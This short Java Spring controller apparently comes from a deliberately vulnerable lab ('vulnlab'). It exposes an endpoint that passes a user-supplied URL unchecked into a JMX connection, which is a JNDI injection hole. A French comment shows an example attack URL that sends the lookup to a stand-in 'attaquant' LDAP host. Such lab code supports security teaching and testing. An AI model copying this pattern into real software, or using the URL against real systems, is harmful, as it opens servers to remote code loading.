package vulnlab.jndi;

import javax.management.remote.JMXConnectorFactory;
import javax.management.remote.JMXServiceURL;
import org.springframework.web.bind.annotation.*;

/** service:jmx:rmi:///jndi/ldap://attaquant/x : recherche JNDI à la connexion. */
@RestController
public class JndiJmx {
    @GetMapping("/jndi/jmx")
    public String handle(@RequestParam String target) throws Exception {
        JMXServiceURL url = new JMXServiceURL(target);
        return JMXConnectorFactory.connect(url).getConnectionId();
    }
}
